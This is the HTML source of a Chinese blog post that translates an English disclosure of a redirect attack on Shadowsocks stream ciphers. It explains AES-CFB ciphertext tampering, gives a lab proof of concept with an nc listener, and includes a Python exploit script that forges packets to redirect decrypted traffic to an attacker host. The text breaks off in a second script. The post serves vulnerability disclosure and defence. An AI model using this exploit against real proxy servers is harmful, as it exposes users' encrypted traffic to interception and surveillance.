<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/orange.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/orange.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta name="google-site-verification" content="HMAT9TapFXG6PRtARF9Qc_fDKANMj-rP3F5FjHjr7kI">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|EB Garamond:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    hostname: new URL('https://dana5haw.com').hostname,
    root: '/',
    scheme: 'Gemini',
    version: '7.7.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
    copycode: {"enable":true,"show_result":true,"style":"mac"},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
    bookmark: {"enable":true,"color":"#222","save":"auto"},
    fancybox: true,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: './public/search.xml',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
  };
</script>


  <meta name="description" content="前言这是Sec-News今天发布的消息，就是shadowsocks存在重定向攻击漏洞。这篇文档是英文的，试着翻译一下。">
<meta property="og:type" content="article">
<meta property="og:title" content="重定向攻击shadowsocks流加密">
<meta property="og:url" content="https://dana5haw.com/posts/Shadow_Love_Why.html">
<meta property="og:site_name" content="Dana Shaw&#39;s blog">
<meta property="og:description" content="前言这是Sec-News今天发布的消息，就是shadowsocks存在重定向攻击漏洞。这篇文档是英文的，试着翻译一下。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8f7y129j30mx08cdh2.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8m6cga8j30jh0d3dmr.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8yeqwzzj30lm0b0gov.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8f7y129j30mx08cdh2.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8m6cga8j30jh0d3dmr.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8yeqwzzj30lm0b0gov.jpg">
<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8z7xmq5j30lk0bkdiu.jpg">
<meta property="article:published_time" content="2020-02-13T14:40:50.000Z">
<meta property="article:modified_time" content="2020-06-27T14:12:29.035Z">
<meta property="article:author" content="Dana Shaw">
<meta property="article:tag" content="漏洞学习">
<meta property="article:tag" content="shadowsocks流加密">
<meta property="article:tag" content="重定向攻击">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8f7y129j30mx08cdh2.jpg">

<link rel="canonical" href="https://dana5haw.com/posts/Shadow_Love_Why.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: false,
    isPost: true
  };
</script>

  <title>重定向攻击shadowsocks流加密 | Dana Shaw's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Dana Shaw's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Dana Shaw's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">为了去往别处</p>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
        <li class="menu-item menu-item-sitemap">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>

  </li>
        <li class="menu-item menu-item-commonweal">

    <a href="/404/" rel="section"><i class="fa fa-fw fa-heartbeat"></i>公益 404</a>

  </li>
        <li class="menu-item menu-item-readnotes">

    <a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" rel="section"><i class="fa fa-fw fa-book"></i>读书笔记</a>

  </li>
        <li class="menu-item menu-item-movienotes">

    <a href="/categories/%E8%A7%82%E5%BD%B1%E7%AC%94%E8%AE%B0/" rel="section"><i class="fa fa-fw fa-youtube"></i>观影笔记</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>

</nav>
  <div class="site-search">
    <div class="popup search-popup">
    <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocorrect="off" autocapitalize="none"
           placeholder="搜索..." spellcheck="false"
           type="text" id="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result"></div>

</div>
<div class="search-pop-overlay"></div>

  </div>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://dana5haw.com/posts/Shadow_Love_Why.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/./images/photo.jpg">
      <meta itemprop="name" content="Dana Shaw">
      <meta itemprop="description" content="连尘埃也想收藏">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Dana Shaw's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          重定向攻击shadowsocks流加密
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-02-13 22:40:50" itemprop="dateCreated datePublished" datetime="2020-02-13T22:40:50+08:00">2020-02-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-27 22:12:29" itemprop="dateModified" datetime="2020-06-27T22:12:29+08:00">2020-06-27</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BF%BB%E8%AF%91/" itemprop="url" rel="index">
                    <span itemprop="name">翻译</span>
                  </a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%AF%8F%E6%97%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">每日漏洞学习</span>
                  </a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>12 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是<a href="http://wiki.ioin.in/" target="_blank" rel="noopener">Sec-News</a>今天发布的消息，就是shadowsocks存在重定向攻击漏洞。这篇文档是英文的，试着翻译一下。</p>
<a id="more"></a>

<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><blockquote>
<p><strong>Redirect attack on Shadowsocks stream ciphers</strong></p>
</blockquote>
<p><strong>shadowsocks流加密存在重定向攻击漏洞</strong></p>
<blockquote>
<p>Shadowsocks is a secure split proxy loosely based on SOCKS5. It’s widely used in china. However, we found a vulnerability in shadowsocks protocol which break the confdentiality of shadowsocks stream cipher. An attacker can easliy decrypt all the encrypted shadowsocks packet using our redirect attack. As the vulnerability is obvious and easy to exploit. I think the government has already know it. So, using shadowsocks in steam cipher cannot hide yourself from surveillance. </p>
</blockquote>
<p>Shadowsocks是大致基于SOCKS5的一种安全分割代理，在中国得到广泛使用。然而，我们发现了shadowsocks协议的一个漏洞，它会破坏shadowsocks流加密的保密性。攻击者可以轻松地使用重定向攻击解密所以已加密的shadowsoocks包。这个漏洞很明显，容易利用。我认为政府早就知道了。所以，使用shadowsocks流加密并不能逃脱监视。</p>
<blockquote>
<p>How shadowsocks works:<br>The Shadowsocks local component (ss-local) acts like a traditional SOCKS5 server and provides proxy service to clients. It encrypts and forwards data streams and packets from the client to the Shadowsocks remote component (ss-remote), which decrypts and forwards to the target. Replies from target are similarly encrypted and relayed by ss-remote back to sslocal, which decrypts and eventually returns to the original client.  client &lt;—&gt; ss-local &lt;–[encrypted]–&gt; ss-remote &lt;—&gt; target </p>
</blockquote>
<p>shadowsocks的工作原理:<br>shadowsocks本地终端（ss-local）像传统的SOCKS5服务器一样，为客户端提供代理服务。它对客户端传输的数据流和数据包进行加密，并发送至shadowsocks远程终端（ss-remote）。由ss-remote解密这些加密的数据，将数据发送到目标服务器。类似地，目标服务器的响应数据被ss-remote加密，并中转到ss-local，最终由ss-local解密并将响应数据返回到原始客户端。<br>流程是这样：client &lt;—&gt; ss-local &lt;–[encrypted]–&gt; ss-remote &lt;—&gt; target</p>
<blockquote>
<p>Official implementations of shadowsocks:<br>shadowsocks: The original Python implementation.<br>shadowsocks-libev: Lightweight C implementation for embedded devices and low end boxes. Very small footprint (several megabytes) for thousands of connections.<br>shadowsocks-go: Go implementation with multi-port, multi-password, user management and trafc statistics support for commercial deployments.<br>o-shadowsocks2: Another Go implementation focusing on core features and code reusability.<br>Shadowsocks-nodejs: Another shadowsocks implementation for nodejs. Although it’s deprecated, there still many people using it through npm. </p>
</blockquote>
<p>shadowsocks的官方实现方式：<br>shadowsocks：由原始的python实现。<br>shadowsocks-libev: 由轻量级C语言实现，用于嵌入式设备和低端盒子。几兆的小脚本就支撑成千上万的连接数。<br>shadowsocks-go: 由Go语言实现，有多个端口，多个密码，为商业应用提供用户管理和数据分析的支撑。<br>o-shadowsocks2: 这也是由Go语言实现，专注于内核特色和代码的复用性。<br>Shadowsocks-nodejs: 由nodejs实现的shadowsocks。虽然不推荐使用，但是依然有很多人通过npm使用它。</p>
<blockquote>
<p>Ciphers of shadowsocks:<br>Shadowsocks support the two kinds of ciphers:<br>Steam ciphers (none-AEAD cipher): Rc4-md5, salsa20,chacha20,chacha-ietf, aes-ctf, bf-cfb, camellia-cfb, aes-cfb<br>AEAD ciphers: aes-gcm,chacha-ietf-poly1305,xchacha20-ietf-poly1305<br>Normally, Stream ciphers provide only confdentiality, Data integrity and authenticity is not guaranteed. Users should use AEAD ciphers whenever possible. We audit all the official implementations of shadowsocks listed above. What surprised us was that only shadowsockslibev support AEAD cipher. All other official implementation only support steam cipher. This means that the data integrity and authenticity of most SS users is not guaranteed from a Mitm attacker.<br>More seriously, we found a vulnerability in shadowsocks protocol which break the confdentiality of shadowsocks stream cipher. An attacker can decrypt all the encrypted shadowsocks packet using our redirect attack. </p>
</blockquote>
<p>shadoesocks加密：<br>Shadowsocks支持两种加密方式：<br>流加密（非AEAD加密）：Rc4-md5, salsa20,chacha20,chacha-ietf, aes-ctf, bf-cfb, camellia-cfb, aes-cfb<br>AEAD加密：aes-gcm,chacha-ietf-poly1305,xchacha20-ietf-poly1305<br>通常，流加密只提供保密性，不能确保数据完整性和真实性。用户应该尽可能使用AEAD加密方式。我们审计了以上列出来的shadowsocks的官方实现方式，令人惊讶的是，只有shadowsockslibev支持AEAD加密，其他的官方实现方式都仅仅支持流加密。这意味着大多数SS用户的数据完整性和真实性难保不被中间人攻击。<br>更严肃的是，我们发现了shadowsocks协议的一个漏洞，它会破坏shadowsocks流加密的保密性。攻击者可以轻松地使用重定向攻击解密所以已加密的shadowsoocks包。</p>
<blockquote>
<p>Redirect attack on Shadowsocks stream cipher:<br>Here we first invest how shadowsocks initiates a connection.<br>Initiating a TCP connection:<br>ss-local initiates a TCP connection to ss-remote by sending an encrypted data stream starting with the target address followed by payload data. The exact encryption scheme diﬀers depending on the cipher used.<br>[target address][payload]<br>ss-remote receives the encrypted data stream, decrypts and parses the leading target address. It then establishes a new TCP connection to the target and forwards payload data to it. ss-remote receives reply from the target, encrypts and forwards it back to the ss-local, until ss-local disconnects. By the way, the UDP packet of shadowsocks has the same struct. </p>
</blockquote>
<p>重定向攻击shadowsocks流加密：<br>我们先给shadowsocks初始化一个连接。<br>初始化一个TCP连接：<br>ss-local发送加密的数据流到ss-remote，初始化一个ss-local到ss-remote的TCP连接，目标地址后面加上payload数据。具体的加密协议因使用的加密方式而异。<br>[目标地址][payload数据]<br>ss-remote接收到加密的数据流，解密并解析出目标地址，然后建立一个ss-remote到目标服务器的TCP连接，将payload数据发送至目标服务器。ss-remote收到目标服务器的响应，解密响应数据，把它返回给ss-local，直到ss-local断开连接。顺便说一下，shadowsocks的UDP包也是一样的结构。</p>
<blockquote>
<p>Address format:<br>Addresses used in Shadowsocks follow the SOCKS5 address format:<br>[1-byte type][variable-length host][2-byte port]<br>The following address types are defned:<br>0x01: host is a 4-byte IPv4 address.<br>0x03: host is a variable length string, starting with a 1-byte length, followed by up to 255-byte domain name.<br>0x04: host is a 16-byte IPv6 address<br>The port number is a 2-byte big-endian unsigned integer. Essentially, ss-remote is performing Network Address Translation for ss-local. </p>
</blockquote>
<p>地址格式：<br>shdowsocks使用的地址遵照SOCKS5的地址格式：<br>[单字节的类型][可变长度的host][2字节的端口号]<br>下面的地址类型是预定义的:<br>0x01: host是4字节的IPv4地址。<br>0x03: host是可变长度的字符串，域名的长度范围从1字节到255字节。<br>0x04: host是16字节的IPv6地址。<br>端口号是2字节大端无符号整型数据。实质上，ss-remote为ss-local做网络地址转换。</p>
<blockquote>
<p>Stream Encryption/Decryption:<br>Stream_encrypt is a function that takes a secret key, an initialization vector, a message, and produces a ciphertext with the same length as the message.<br>Stream_encrypt(key, IV, message) =&gt; ciphertext<br>Stream_decrypt is a function that takes a secret key, an initializaiton vector, a ciphertext, and produces the original message.   Stream_decrypt(key, IV, ciphertext) =&gt; message<br>The key can be input directly from user or generated from a password. The key derivation is following EVP_BytesToKey(3) in OpenSSL. The detailed spec can be found here.<br>[IV][encrypted payload]<br>Cleverly, attacker can brute force your password and then decrypt your packet. Which means there is no forward security for shadowsocks. You can easily protect yourself from the brute force attack by using a strong password. </p>
</blockquote>
<p>流加密/流解密：<br>流加密函数通过使用一个密钥，一个初始向量，一个消息体，生成一个和消息体等长的加密文本。<br>Stream_encrypt(key, IV, message) =&gt; ciphertext<br>流解密函数通过使用一个密钥，一个初始向量，一个加密文本，生成原始消息体。<br>Stream_decrypt(key, IV, ciphertext) =&gt; message<br>密钥可以直接由用户输入，或者由密码生成。密钥推导遵循OpenSSL的EVP_BytesToKey(3)，详细规范可以在这里找到。<br>[IV][encrypted payload]<br>聪明的攻击者很轻易就能暴力破解你的密码，解密数据包。这意味着shadowsocks没有前向安全性。你可以设置强密码，这样能轻易避免遭受暴力破解攻击。</p>
<blockquote>
<p>Redirect attack on Shadowsocks<br>Is there anyway we can decrypt shadowsocks without brute force the password? Yes, there is. As we mentioned, stream cipher in shadowsocks does not provide data integrity. So we can create a new ciphertext by modifying the existed one. If we know the plaintext of some particular ciphertext, we can even completely control the content of the plaintext.  In particular, if we make new ciphertext encrypting the following content:<br>[target address] [payload]<br>And the target IP address is controlled by you. We can prevent to be a valid ss-local to create a redirect tunnel like this:<br>ss-local(fake one) &lt;–[encrypted]–&gt; ss-remote &lt;—&gt; target(controlled)<br>Any encrypted packet we send in the [encrypted] tunnel, the ss-remote will decrypt it and redirect the plaintext to the target IP address your control. Then we can decrypt every encrypted shadowsocks packet by using this tunnel. </p>
</blockquote>
<p>重定向攻击shadowsocks<br>有没有什么方法可以不用暴力破解就能解密shadowsocks？答案是有的。正如我们提到过，流加密不提供数据完整性，所以我们可以修改已有的加密文本来新建一个加密文本。如果我们知道某个特殊加密文本的纯文本，我们甚至可以完全控制这个纯文本的内容。尤其是，如果我们新建的加密文本加密了以下内容：<br>[target address] [payload]<br>这个IP地址就被你控制了。我们可以做一个非法的ss-local，去创建这样的重定向通道：<br>ss-local(fake one) &lt;–[encrypted]–&gt; ss-remote &lt;—&gt; target(controlled)<br>我们在加密通道发出的所有加密数据包，ss-remote都会解密之，并且把纯文本重定向到你已经控制的目标服务器。我们就可以通过这个通道解密所有已加密的shadowsocks数据包。</p>
<blockquote>
<p>Demo: AES-256-CFB<br>Here we take AES-256-CFB as an example, to show the power of redirect attack on shadowsocks stream cipher. Give any ciphertext [IV][encrypted payload]. The AES-CFB decryption work like this:<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8f7y129j30mx08cdh2.jpg" alt="image.png"><br>As we can see, if we modify the first block of ciphertext from c1 to c1’. We can change the first block of plaintext from p1 to p1’. The relation is the following:<br>c1’=Xor(c1,r)<br>p1’=Xor(p1,r)<br>To construct a valid [target address]=[0x01,IP（4bytes）,Port(2bytes)] , we only need to control the first 7 byte the p1’. If we know the first 7bytes of p1, we can create redirect tunnel to decrypt every encrypted packet.<br>So the problem becomes: How can we get ciphertext [IV][encrypted payload] with known first 7 bytes. It’s easy, we can get it in many ways. In this example, we use the common pattern in HTTP protocol. As we see in the following tcp flow:<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8m6cga8j30jh0d3dmr.jpg" alt="image.png"><br>We user access some web site. The Http server always reply with a prefix ‘HTTP/1.’. We can collect all the TCP follow, and suppose that it is http connection. Then we can try to modify the first packet (“”) of it to get a desired c1’ with [malicious address] [payload] in p1’. Although we don’t know which one is correct. But we can try many times, once there is a correct HTTP connection, we immediately construct a redirect tunnel. Then we can use this tunnel to decrypt every encrypted packet.<br>Here is the POC for AES-256-CFB in shadowsocks:<br>ss-server runing on : 192.168.1.2:8899<br>ss-client running on: 192.168.1.4<br>attacker IP: 192.168.1.3<br>Attacker capture a http connection, and listen on 192.168.1.3:4626 with:<br>nc -l -p 4626 &gt;1.txt<br>Then attacker use the following code to create a redirect tunnel:<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8yeqwzzj30lm0b0gov.jpg" alt="image.png"><br>Then we can see the decrypted packet:<br>How to defense you self from redirect attack:<br>Do not use : shadowsocks-py, shadowsocoks-go, go-shadowsocks2, shadowsocoks-nodejs.<br>Only Use:  shadowsocks-libev, and only use the AEAD ciphers. </p>
</blockquote>
<p>例子: AES-256-CFB<br>为了演示重定向攻击流加密，我们用AES-256-CFB来举例。给一个任意的加密文本，初始向量，加密的payload数据，AES-CFB解密的过程就像这样：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8f7y129j30mx08cdh2.jpg" alt="image.png"><br>正如我们看到的，如果我们修改从c1到c1’的加密文本的第一部分，我们就可以修改从p1到p1’的第一部分。关系如下：<br>c1’=Xor(c1,r)<br>p1’=Xor(p1,r)<br>为了构造一个有效的目标地址[target address]=[0x01,IP（4bytes）,Port(2bytes)]，我们只需要控制p1’的前7个字节。如果我们知道p1的前7个字节，就可以创建重定向通道，解密任一已加密的数据包。<br>所以问题变成了：已知了前7个字节，我们如何得到加密文本，初始向量，已加密的payload数据？很简单，有很多种方式得到。比如，我们使用HTTP协议的常用模式，如下图所示的tcp流：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8m6cga8j30jh0d3dmr.jpg" alt="image.png"><br>我们用户访问某个网站时，Http服务器总是会回复‘HTTP/1.’这样的前缀。我们可以收集所有的TCP流，我们认为就是http连接。然后我们可以试着修改第一个包，利用p1’的 [malicious address] [payload]得到一个想要的c1’。尽管我们不知道哪一个是正确的，但是我们可以多次尝试，直到建立正确的HTTP连接，立刻就会创建一个重定向通道。接下来就可以使用这个通道解密任一已加密的包。<br>这是shadowsocks AES-256-CFB的POC：<br>ss-server runing on : 192.168.1.2:8899<br>ss-client running on: 192.168.1.4<br>attacker IP: 192.168.1.3<br>攻击者捕获一个http连接，用命令<code>nc -l -p 4626 &gt;1.txt</code>监听192.168.1.3:4626，然后攻击者用以下代码创建一个重定向通道：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8yeqwzzj30lm0b0gov.jpg" alt="image.png"><br>然后我们可以看到解密的数据包：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbv8z7xmq5j30lk0bkdiu.jpg" alt="image.png"><br>怎样避免受到重定向攻击：<br>不使用：shadowsocks-py, shadowsocoks-go, go-shadowsocks2, shadowsocoks-nodejs。<br>只使用：shadowsocks-libev, 并且只用AEAD这种加密方式。</p>
<h2 id="创建定向通道的代码"><a href="#创建定向通道的代码" class="headerlink" title="创建定向通道的代码"></a>创建定向通道的代码</h2><p>分为http请求和https请求：</p>
<ul>
<li>http请求：attack_with_http_pocket.py<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> encrypt</span><br><span class="line"><span class="keyword">from</span> encrypt <span class="keyword">import</span> Encryptor</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(s1,s2)</span>:</span></span><br><span class="line">	n=len(s1)</span><br><span class="line">	r=<span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">		r+=chr(ord(s1[i])^ord(s2[i]))</span><br><span class="line">	<span class="keyword">return</span> r</span><br><span class="line">method=<span class="string">'aes-256-cfb'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up</span><span class="params">(c)</span>:</span></span><br><span class="line">    l=<span class="number">16</span>-len(c)%<span class="number">16</span></span><br><span class="line">    c=c+<span class="string">'\x00'</span>*l</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="comment">#c is a capture http packet.</span></span><br><span class="line">c=<span class="string">'57122435b0ab1e28db5e59f49f5510dc7196c0cba5e6119eb8cf293210522da840b1360e7b0727122e90bb9c474f586574742fdbc5bc6ca39d8f79afefc21db6a3dbf263d6116260dd7f763691b105091ce07e8f98e9215639099c0912defd608c8c0da1e9ce4f6127a933e60833a953c1ace7f7c6589ad0f7cf1347e2967699cfb70a9a9b6114f13454f49472793504f1487b0ff73604fe0fd82ae92b8ca082fc8ca978303da066edda40e6'</span></span><br><span class="line">c=c.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="comment">#c=up(c)</span></span><br><span class="line">prefix_http=<span class="string">'HTTP/1.'</span></span><br><span class="line">prefix_https_recv=<span class="string">'\x16\x03\x03\x00\x8d\x02\x00'</span></span><br><span class="line">prefix_https_send=<span class="string">'\x16\x03\x01\x02\x00\x01\x00'</span></span><br><span class="line"><span class="comment">#targetIP='\x01\xc0\xa8\x01\x03\x12\x12'# malicous target IP address: 192.168.1.3:4626</span></span><br><span class="line"><span class="comment">#targetIP='\x01\x23\xbd\xa0\x6b\x1f\x90'</span></span><br><span class="line">targetIP=<span class="string">'\x01\x2f\x34\xab\x43\x12\x12'</span></span><br><span class="line">x=xor(prefix_https_recv,targetIP)</span><br><span class="line">y=c[<span class="number">16</span>:<span class="number">16</span>+<span class="number">7</span>]</span><br><span class="line">z=xor(x,y)</span><br><span class="line">cipertext=c[<span class="number">0</span>:<span class="number">16</span>]+z+c[<span class="number">16</span>+<span class="number">7</span>:]</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">obj = socket.socket()</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"begin\n"</span>)</span><br><span class="line">obj.connect((<span class="string">"ip"</span>,<span class="number">8080</span>))<span class="comment"># ss-server is running on 192.168.1.2:8899</span></span><br><span class="line">obj.send(cipertext)<span class="comment"># send the payload to construct a redirect tunnel</span></span><br><span class="line">buf=obj.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></li>
<li>https请求：attack2_with_https_pocket.py<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(s1,s2)</span>:</span></span><br><span class="line">	n=len(s1)</span><br><span class="line">	r=<span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">		r+=chr(ord(s1[i])^ord(s2[i]))</span><br><span class="line">	<span class="keyword">return</span> r</span><br><span class="line">method=<span class="string">'aes-256-cfb'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up</span><span class="params">(c)</span>:</span></span><br><span class="line">    l=<span class="number">16</span>-len(c)%<span class="number">16</span></span><br><span class="line">    c=c+<span class="string">'\x00'</span>*l</span><br><span class="line">    